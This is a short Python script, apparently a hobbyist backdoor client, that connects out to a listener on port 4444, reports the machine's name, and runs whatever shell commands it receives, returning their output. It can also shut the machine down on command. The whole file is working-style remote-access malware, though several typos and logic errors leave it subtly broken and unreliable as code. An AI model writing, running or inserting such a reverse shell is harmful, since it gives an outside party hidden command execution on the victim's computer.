import socket
import os
import sys
import subprocess
def connect():
    #clears terminal
    os.system('cls')
    #global variables
    global host
    global port
    global s
    #initalizing socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #setting target ip and port
    port = 4444 # You want this to be equal to whatever you set your listening port
    host = "localhost" # ip
    #you could use a dns host here: socket.gethostbyname()
    #try: connect to port and send hostname for socket.recv on other end
    try:
        #Connecting
        s.connect((host,port))
        s.send(os.environ['COMPUTERNAME'])
        #if something goes wrong try again below
    except:
        connect()
def recieve():
    #recieve command
    recieve = s.recv(1024)
    #if input from server == quit
    if recieve == 'exit':
        s.close()
    #if recieved data == pwn spawn shell
    elif recieve[0:5] == 'pwn':
        proc2 = subprocess.Popen(recieve[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_equals = proc2.stdout.read() + proc2.stderr.read()
        erArgs = stdout_equals
    elif receive[0:5] == 'shutdown':
        subprocess.call("shutdown", shell=True)
        pArgs = "Completed."
        send(pArgs)
    else:
        erArgs = 'Invalid input.'
    send(erArgs)
def send(erArgs):
    send = s.send(erArgs)
    receive()
connect()
recieve()
s.close()
 
 
